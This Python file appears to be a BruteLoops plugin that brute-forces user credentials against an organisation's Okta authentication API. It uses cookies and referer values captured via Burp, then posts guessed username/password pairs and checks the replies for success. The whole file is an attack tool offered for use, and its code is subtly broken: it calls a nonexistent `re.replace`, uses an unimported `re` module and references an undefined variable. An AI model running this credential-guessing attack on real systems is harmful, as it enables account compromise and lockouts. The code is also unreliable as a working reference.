#!/usr/bin/env python3
import warnings
warnings.filterwarnings('ignore')
from re import search
import requests
from BruteLoops.example.module import Module as BLModule

FAIL_VALUE = '"errorCode":"E0000004","errorSummary":"Authentication ' \
        'failed"'

# =================
# MODULE PROPERTIES
# =================

DESCRIPTION = \
'''Brute force credentials for an application configured to use Okta
as an external identity provider. Note that this module will require 
the operator to proxy an authentication request through Burp to get
the artifacts required to support the attack: cookies_url, and 
cookies_referer_url. WARNING: If valid credentials are already
available, testing them through BruteLoops is recommended to ensure
that changes to Okta's authentication process have not broken this
module (things feel complicated).
'''

# ===========
# HELP VALUES
# ===========

URL_HELP = \
'The Okta URL to authenticate to, usually in the form of: ' \
'https://<target>.okta.com/api/v1/authn'

COOKIES_URL_HELP = \
'URL that issues cookies required for authentication. Should be a URL ' \
'like "https://<target>.okta.com/login/login.htm?fromURI=<encoded_param>". ' \
'Authenticate to the application that uses Okta as an identity provider ' \
'while proxying through Burp to identify this value.'

REFERER_URL_HELP = \
'The URL that should be embedded in the HTTP referer header when ' \
'acquiring cookies from the `cookies_url` source. This is the value ' \
'of the referer header found in the same request described in ' \
'`cookies_url`.'

class Module(BLModule):

    name = 'http.okta'
    brief_description = 'Okta JSON API'
    description = DESCRIPTION

    def __init__(self, url:f'required:True,type:str,help:{URL_HELP}',
            cookies_url:f'required:True,type:str,help:{COOKIES_URL_HELP}',
            cookies_referer_url:'required:False,type:str,help:' \
                f'{REFERER_URL_HELP}'=None,
            proxies:'required:False,type:str,help:HTTP proxies'={},
            headers:'required:False,type:str,help:HTTP headers'={},
            verify_ssl:'required:False,type:bool,help:Verify SSL'=False):

        self.url = url
        self.cookies_url = cookies_url
        self.cookies_referer_url = cookies_referer_url
        self.proxies = proxies
        self.headers = headers
        self.verify_ssl = verify_ssl

    def __call__(self,username,password,*args,**kwargs):

        # =====
        # NOTES
        # =====
        '''
        - Okta serves as an identity provider
        - Upstream services authenticate users via Okta's services
        - As a web app, the origin service will redirect the user to
          Okta to complete authentication
        - Cursory research suggests the following values are needed
          to authenticate to the application programmatically during
          a brute force attack:
            - The URL which the credentials will be posted to once
              cookies have been obtained
                - Appears to be in the form:
                  https://<target>.okta.com/api/v1/authn
            - Two values that will likely need to be acquired by
              proxying an authentication request through Burp:
              - The URL that is used to issue a valid session token, a
                "cookies_url"
              - The referer header from the request that produced that
                URL, a "cookies_referer_url"
        '''

        # =====================
        # CRAFT THE COOKIES URL
        # =====================
        '''
        - logic crafts the URL used to obtain cookies for authentication
        - first, it splits the username value into a tuple: (username, domain)
        - second, it updates the '{USERNAME}' and '{DOMAIN}' values in the
          cookies_url argument accordingly
        '''

        try:
            # parse the username and domain from the username
            groups = re.search('^(.+)(@|\\\\|/)(.+)',username).groups()

            # update the cookies_url value
            cookies_url = re.replace('{USERNAME}',self.cookies_url,
                    groups[0])
            cookies_url = re.replace('{DOMAIN}',cookies_url,groups[2])
        except Exception as exception:
            return [0, username, password]


        # ==============
        # UPDATE HEADERS
        # ==============
        '''
        - inject user-supplied headers
        - ensure that the cookies_referer_url is always the referer
        '''

        headers = self.headers

        if self.cookies_referer_url:
            headers['Referer'] = cookies_referer_url

        # =============================
        # BUILD SESSION AND GET COOKIES
        # =============================

        session = requests.Session()
        session.get(cookies_url, headers=headers)

        # ===================================
        # BUILD REQUEST DATA AND MAKE REQUEST
        # ===================================
        '''
        - authentication JSON payload is crafted here
        - referer header is updated to match the cookies_url
        '''

        # post data
        data = {
            "password":password,
            "username":username,
            "options":
            {
                "warnBeforePasswordExpired":True,
                "multiOptionalFactorEnroll":True
            }
        }

        # Update headers again. Referer header should match the cookies_url
        headers['referer'] = cookies_url
    
        # make the request
        resp = session.post(self.url,
                json=data,
                headers=headers,
                verify=self.verify_ssl,
                allow_redirects=False,
                proxies=self.proxies)

        # ===================================
        # CHECK FOR SUCCESSFUL AUTHENTICATION
        # ===================================
    
        # verify credentials and return outcome
        if resp.status_code == 401 and \
                not re.search(FAIL_VALUE,resp.content):
            return [0, username, password]
        else:
            return [1, username, password]
